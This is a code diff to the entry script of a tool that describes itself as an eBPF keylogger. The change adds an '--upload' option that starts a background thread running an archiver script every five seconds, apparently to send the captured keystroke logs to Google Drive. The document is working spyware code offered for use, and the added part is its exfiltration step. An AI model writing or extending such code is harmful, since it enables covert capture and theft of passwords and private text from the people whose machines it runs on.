@@ -2,16 +2,33 @@ import os, sys
 import argparse
 
 from bpf_program import BPFProgram
+import threading
+import time
 
 DESCRIPTION = """
 A keylogger written in eBPF.
 """
 
 
+def threadFunc():
+    while True:
+        os.system("python3 src/python/archiver.py")
+        time.sleep(5)
+
+
+th = threading.Thread(target=threadFunc)
+
+
 def main(args):
-    bpf = BPFProgram(args)
-    bpf.main()
     print(args)
+    if args.upload:
+        th.start()
+        bpf = BPFProgram(args)
+        bpf.main()
+        th.join()
+    else:
+        bpf = BPFProgram(args)
+        bpf.main()
 
 
 def is_root():
@@ -37,6 +54,11 @@ def parse_args(args=sys.argv[1:]):
     output_options = parser.add_mutually_exclusive_group()
     output_options.add_argument(
         "-o", "--outfile", type=str, help="Output trace to a file instead of stdout."
+    )
+
+    # upload
+    parser.add_argument(
+        "-u", "--upload", action="store_true", help="upload the files to google drive"
     )
 
     args = parser.parse_args(args)
